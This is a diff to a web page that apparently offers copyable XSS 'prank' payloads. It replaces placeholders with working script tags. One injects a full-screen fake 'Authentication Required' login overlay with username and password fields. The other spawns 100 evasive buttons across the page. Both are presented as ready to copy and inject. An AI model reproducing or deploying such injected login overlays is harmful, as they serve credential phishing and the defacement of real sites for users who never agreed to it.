@@ -134,13 +134,29 @@ document.body.innerHTML += "&lt;h1 style='text-align:center;color:#00aaff;'&gt;M
           <p class="description">
             Shows a full-screen blurred login prompt — perfect for UI-themed XSS pranks.
           </p>
+          
           <pre>
 &lt;script&gt;
-document.body.innerHTML += `
-... (your fake login box code here) ...
-`;
+document.body.innerHTML += \`
+&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;
+backdrop-filter:blur(6px);background:rgba(0,0,0,0.65);
+display:flex;align-items:center;justify-content:center;
+font-family:Poppins,sans-serif;color:#e0f0ff;"&gt;
+  &lt;div style="background:#101820;padding:30px;border:2px solid #00aaff;
+  border-radius:10px;width:320px;text-align:center;box-shadow:0 0 12px #00aaff;"&gt;
+    &lt;h2 style="color:#00aaff;"&gt;Authentication Required&lt;/h2&gt;
+    &lt;input placeholder="Username" style="width:90%;padding:10px;margin:10px 0;
+    border:1px solid #00aaff;background:#0e141b;color:#e0f0ff;"&gt;
+    &lt;input type="password" placeholder="Password" style="width:90%;padding:10px;margin:10px 0;
+    border:1px solid #00aaff;background:#0e141b;color:#e0f0ff;"&gt;
+    &lt;button style="background:#00aaff;border:none;color:white;padding:10px 22px;
+    border-radius:6px;cursor:pointer;"&gt;Login&lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+\`;
 &lt;/script&gt;
-          </pre>
+</pre>
+
           <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
         </div>
 
@@ -180,11 +196,33 @@ document.body.innerHTML += "&lt;style&gt;@keyframes spin { from{transform:rotate
         <div class="payload-item">
           <h3>Bouncing Buttons</h3>
           <p class="description">Spawns 100 bouncing UI buttons that jump away when hovered.</p>
+          
           <pre>
 &lt;script&gt;
-for(let i=0;i<100;i++){ ... }
+for (let i = 0; i &lt; 100; i++) {
+  const b = document.createElement("button");
+  b.textContent = "Click";
+  b.style.position = "fixed";
+  b.style.left = Math.random() * 100 + "vw";
+  b.style.top = Math.random() * 100 + "vh";
+  b.style.transition = "0.2s";
+  b.style.background = "#00aaff";
+  b.style.color = "#fff";
+  b.style.border = "none";
+  b.style.padding = "8px 16px";
+  b.style.borderRadius = "6px";
+  b.style.cursor = "pointer";
+
+  b.onmouseover = () =&gt; {
+    b.style.left = Math.random() * 100 + "vw";
+    b.style.top = Math.random() * 100 + "vh";
+  };
+
+  document.body.appendChild(b);
+}
 &lt;/script&gt;
-          </pre>
+</pre>
+
           <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
         </div>
 
